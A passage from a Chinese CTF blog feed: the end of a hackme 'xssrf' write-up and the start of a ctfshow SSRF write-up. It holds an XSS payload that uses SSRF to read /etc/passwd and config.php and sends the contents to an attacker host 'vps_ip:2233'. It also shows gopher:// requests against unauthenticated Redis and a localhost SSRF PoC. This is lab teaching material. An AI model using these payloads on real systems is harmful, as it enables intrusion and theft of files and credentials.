class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那继续通过这种方式获取利用 <code>request.php</code> 吧，存在 SSRF</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///etc/passwd&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>读了一下 /etc/passwd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:105:107::/var/run/dbus:/bin/false</span><br><span class="line">mysql:x:106:108:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">redis:x:107:110::/var/lib/redis:/bin/false</span><br></pre></td></tr></table></figure><p>发现 www-data 解析目录为 /var/www 并且有 redis 用户</p><p>尝试了 <code>/proc/self/environ</code> 和 <code>/proc/self/cmdline</code> 都无法获取准确的 web 根目录，只能猜了，比如 /var/www/html （</p><p>读取一下扫描目录发现的 <code>config.php</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>解码一下得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// database config</span></span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;xssrf&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASS&#x27;</span>, <span class="string">&#x27;xssrfmeplz&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;host=localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;xssrf&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// redis config</span></span><br><span class="line">define(<span class="string">&#x27;REDIS_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;REDIS_PORT&#x27;</span>, <span class="number">25566</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// define flag</span></span><br><span class="line">define(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c_hardness</span> = <span class="number">5</span>; <span class="comment">// how many proof of work leading zeros</span></span><br></pre></td></tr></table></figure><p>第 2 个 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;</span><br></pre></td></tr></table></figure><p>说好的第 2 个 flag 在 redis 里呢…</p><h2 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h2><p>上一个 flag 提示 redis 端口在 <code>25566</code></p><p>先试试 gopher 协议 未授权打 redis</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>redis环境信息被愉快的打印出来</p><p><img src="/img/xssrf/image-20210426153402679.png" class="lazyload" data-srcset="/img/xssrf/image-20210426153402679.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426153402679"></p><p>依次获取 redis 的键和值即可</p><ul><li>获取所有键</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(<span class="string">&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a&quot;</span>);</span><br></pre></td></tr></table></figure><p>读取结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*1</span><br><span class="line"></span><br><span class="line">$4</span><br><span class="line"></span><br><span class="line">flag</span><br></pre></td></tr></table></figure><ul><li>判断flag键的值类型</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a&quot;);</span><br></pre></td></tr></table></figure><p>读取结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+list</span><br></pre></td></tr></table></figure><ul><li>获取flag键的所有列表值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%2520-1%250a&quot;);</span><br></pre></td></tr></table></figure><p>把结果复制进字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">*53</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">u</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">u</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">w</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">R</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">G</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">L</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">F</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">  flag += c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>].replace(<span class="string">&quot;1$&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>结果在去除最后三个字符 <code>35*</code> 即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Redis without authentication is easy to exploit&#125;</span><br></pre></td></tr></table></figure><p>虽然生产环境利用起来相对困难，不过毕竟是CTF嘛，骚思路多一个是一个 （</p><hr><p>参考链接</p><div class="note link green"><p><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/">https://skysec.top/2018/08/17/xss-ssrf-redis/</a></p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> hackme </category>
          
          <category> ctf练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf练习 </tag>
            
            <tag> hackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow SSRF篇</title>
      <link href="//p/2021/ctfshow-ssrf/"/>
      <url>//p/2021/ctfshow-ssrf/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>要是多点组合拳，或者条件苛刻些就好了 （</p><h2 id="web351-简单认识"><a href="#web351-简单认识" class="headerlink" title="web351 简单认识"></a>web351 简单认识</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># POST</span><br><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617686456106-a9e92005-8b62-4ded-9302-9d144c9360b5.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617686456106-a9e92005-8b62-4ded-9302-9d144c9360b5.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web352-永远相信美好的事情即将发生"><a href="#web352-永远相信美好的事情即将发生" class="headerlink" title="web352 永远相信美好的事情即将发生"></a>web352 永远相信美好的事情即将发生</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span 